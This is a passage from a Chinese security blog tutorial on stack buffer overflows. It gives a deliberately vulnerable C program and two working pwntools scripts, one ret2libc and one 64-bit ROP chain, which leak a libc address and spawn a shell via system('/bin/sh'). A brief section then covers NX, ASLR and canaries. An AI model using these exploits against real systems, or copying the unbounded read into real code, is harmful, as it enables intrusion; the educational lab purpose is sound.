+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, s, <span class="number">128</span>);</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>,s,<span class="number">128</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vul();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<strong>libc</strong>中可以找到s<strong>ystem()</strong>和<strong>/bin/sh</strong>的地址(为偏移量），利用第一次缓冲区溢出泄露地址，<strong>base+read_offset=read_addr</strong>，所以得到<strong>read_offset</strong>的地址，然后找出<strong>read_addr</strong>的地址，则</p>
+<blockquote>
+<p><strong>base=read_addr-ead_offset</strong></p>
+<p><strong>system_addr=base+system_offset</strong></p>
+</blockquote>
+<p>在第二次缓冲区溢出时，程序会新开一个<strong>system</strong>进程，且需要调用的参数<strong>/bin/sh</strong>在栈中。</p>
+<p><strong>payload1：</strong><code>padding + address of write_plt + address of vul + address of parameter write()</code></p>
+<p><strong>payload2：</strong><code>padding + address of system() + address of dead+address of /bin/sh</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./vul"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./vul"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">read_plt = elf.plt[<span class="string">"read"</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">"a"</span>*<span class="number">44</span></span><br><span class="line">payload += p32(write_plt)</span><br><span class="line">payload += p32(elf.symbols[<span class="string">"vul"</span>]) <span class="comment">#再次执行vul，造成第二次缓冲区溢出</span></span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(elf.got[<span class="string">"read"</span>])</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recv(<span class="number">128</span>)</span><br><span class="line">ret = io.recv(<span class="number">4</span>)</span><br><span class="line">read_addr = u32(ret) </span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(read_addr)</span><br><span class="line"></span><br><span class="line">read_offset = libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binsh_offset = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">base = read_addr - read_offset</span><br><span class="line">system_addr = base + system_offset</span><br><span class="line">binsh_addr = base + binsh_offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2  = <span class="string">"a"</span> * <span class="number">44</span></span><br><span class="line">payload2 += p32(system_addr)</span><br><span class="line">payload2 += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload2 += p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="－－修改返回地址，让其指向内存中已有的一段指令-–ROP-Return-Oriented-Programming"><a href="#－－修改返回地址，让其指向内存中已有的一段指令-–ROP-Return-Oriented-Programming" class="headerlink" title="－－修改返回地址，让其指向内存中已有的一段指令 –ROP ( Return Oriented Programming )"></a>－－修改返回地址，让其指向内存中已有的一段指令 –<strong>ROP ( Return Oriented Programming )</strong></h5><p>在64位程序中局部变量存储在栈中，函数的参数存储在寄存器中，无法通过代码来修改寄存器中的参数，但是可以通过指令去修改。</p>
+<p>在内存中确定某段指令的地址，并用其覆盖返回地址。但是有时候目标函数在内存中无法找到特定的函数可以适配，这时需要在内存中寻找多个指令片段，拼凑处一系列操作。可以使用<strong>rp++</strong>来搜索以ret结尾的指令片段。</p>
+<p><code>rp++ -f vul64 -r 5</code></p>
+<p><img src="%5Cimages%5CBuffer%5C5.png" alt="5"></p>
+<p><strong>payload:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./vul64"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./vul64"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc64.so.6"</span>)</span><br><span class="line"><span class="comment">#io = remote('127.0.0.1', 10001)</span></span><br><span class="line">read_plt = elf.plt[<span class="string">"read"</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi_ret =<span class="number">0x0400623</span> <span class="comment">#:pop rdi ; ret  ;  (1 found)</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x00400621</span> <span class="comment">#: pop rsi ; pop r15 ; ret  ;  (1 found)</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">"a"</span>*<span class="number">40</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_r15_ret)</span><br><span class="line">payload += p64(elf.got[<span class="string">"read"</span>])</span><br><span class="line">payload += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)</span><br><span class="line">payload += p64(write_plt)</span><br><span class="line">payload += p64(elf.symbols[<span class="string">"vul"</span>])</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recv(<span class="number">128</span>)</span><br><span class="line">ret = io.recv(<span class="number">8</span>)</span><br><span class="line">read_addr = u64(ret)</span><br><span class="line"></span><br><span class="line">read_offset = libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binsh_offset = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base = read_addr - read_offset</span><br><span class="line">system_addr = base + system_offset</span><br><span class="line">binsh_addr = base + binsh_offset</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">"a"</span> * <span class="number">40</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>利用俩次缓冲区溢出来执行system(“/bin/sh”)</p>
+<h4 id="0x40防御措施"><a href="#0x40防御措施" class="headerlink" title="0x40防御措施"></a>0x40防御措施</h4><p>通常情况下程序在默认编译设置下都会取消栈上数据的可执行权限，这样可以避免简单的<code>shellcode</code>溢出攻击。然后在操作系统中开启<strong>内存布局随机化</strong><code>（ASLR)</code>,这样可以增大确定堆栈内数据和动态库内存地址的难度。编译程序时还可以设置某些编译选项，使程序在运行时会在函数栈上的 ebp 地址和返回地址之间生成一个特殊的值，这个值被称为“金丝雀”。这样一旦发生了栈溢出并覆盖了返回地址，这个值就会被改写，从而实现函数栈的越界检查。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/17/%E9%83%A8%E5%88%86CTF%E6%80%9D%E8%B7%AF/" rel="next" title="部分CTF解题思路">
+                <i class="fa fa-chevron-left"></i> 部分CTF解题思路
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/20/unknowndevice/" rel="prev" title="unknowndevice靶机测试">
+                unknowndevice靶机测试 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="ChongMing" />
+            
+              <p class="site-author-name" itemprop="name">ChongMing</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x10文件描述符简介"><span class="nav-number">1.</span> <span class="nav-text">0x10文件描述符简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x20栈溢出"><span class="nav-number">2.</span> <span class="nav-text">0x20栈溢出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x30栈溢出练习"><span class="nav-number">3.</span> <span class="nav-text">0x30栈溢出练习</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#–通过栈溢出，使函数返回程序中的system-函数"><span class="nav-number">3.1.</span> <span class="nav-text">–通过栈溢出，使函数返回程序中的system()函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#–修改某个被调用函数的地址，让其指向另一个函数（hijack-GOT）"><span class="nav-number">3.2.</span> <span class="nav-text">–修改某个被调用函数的地址，让其指向另一个函数（hijack GOT）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#–修改返回地址，让其指向溢出数据中的一段指令（shellcode）"><span class="nav-number">3.3.</span> <span class="nav-text">–修改返回地址，让其指向溢出数据中的一段指令（shellcode）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#–修改返回地址，让其指向内存中已有的某个函数（return2libc）"><span class="nav-number">3.4.</span> <span class="nav-text">–修改返回地址，让其指向内存中已有的某个函数（return2libc）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#－－修改返回地址，让其指向内存中已有的一段指令-–ROP-Return-Oriented-Programming"><span class="nav-number">3.5.</span> <span class="nav-text">－－修改返回地址，让其指向内存中已有的一段指令 –ROP ( Return Oriented Programming )</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x40防御措施"><span class="nav-number">4.</span> <span class="nav-text">0x40防御措施</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ChongMing</span>
+
+  
+</div>
+<!--
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+-->
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
